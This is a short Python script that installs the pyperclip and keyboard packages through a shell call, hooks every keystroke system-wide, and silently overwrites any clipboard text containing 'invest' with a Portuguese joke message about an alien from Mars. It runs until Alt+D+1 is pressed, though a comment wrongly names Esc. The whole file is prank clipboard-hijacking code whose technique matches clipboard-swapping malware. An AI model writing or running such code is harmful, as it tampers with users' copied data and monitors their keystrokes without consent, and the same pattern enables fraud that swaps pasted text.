import subprocess
bash_command = "pip install pyperclip keyboard"
try:
    result = subprocess.run(bash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # Print the output of the command
    print("Command output:")
    print(result.stdout)
    
    # Check for any errors
    if result.returncode != 0:
        print("Error:")
        print(result.stderr)
except Exception as e:
    print(f"An error occurred: {e}")

import keyboard
import pyperclip

# Define the replacement text
replacement_text = "meu pai conseguiu uma conexão com um alienígena chamado ThakinGyi de Marte, muito legal vocês acham?"

# Function to handle clipboard changes
def on_clipboard_change(e):
    clipboard_text = pyperclip.paste()

    # Check if "invest" is in the clipboard text
    if "invest"    in clipboard_text:
        
        pyperclip.copy(replacement_text)

        

# Hook the clipboard change event
keyboard.hook(on_clipboard_change)

# Keep the script running indefinitely
keyboard.wait("Alt+D+1")  # Press the 'esc' key to exit

# Unhook the clipboard change event when done
keyboard.unhook_all()
